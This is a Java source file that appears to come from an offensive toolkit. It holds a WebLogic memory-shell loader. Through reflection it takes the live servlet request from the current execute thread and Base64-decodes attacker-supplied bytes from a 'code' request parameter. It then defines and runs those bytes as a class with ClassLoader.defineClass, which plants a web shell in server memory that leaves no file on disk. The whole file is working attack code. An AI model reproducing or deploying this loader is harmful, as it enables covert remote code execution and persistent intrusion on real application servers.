package com.feihong.template;

import org.apache.shiro.codec.Base64;
import weblogic.servlet.internal.ServletRequestImpl;
import weblogic.work.ExecuteThread;
import weblogic.work.WorkAdapter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class WeblogicMemshellLoader {
    public WeblogicMemshellLoader() throws Exception {
        WorkAdapter workAdapter = ((ExecuteThread)Thread.currentThread()).getCurrentWork();
        Field field = workAdapter.getClass().getDeclaredField("connectionHandler");
        field.setAccessible(true);
        Object obj = field.get(workAdapter);
        ServletRequestImpl servletRequest = (ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);

        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        String code = servletRequest.getParameter("code");
        byte[] bytes = Base64.decode(code);
        Class clz;
        try{
            clz = classLoader.loadClass("com.feihong.template.WeblogicMemshellTemplate");
        }catch(Exception e){
            method.setAccessible(true);
            clz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
        }
        clz.getConstructor(new Class[]{ServletRequestImpl.class}).newInstance(new Object[]{servletRequest});
    }
}
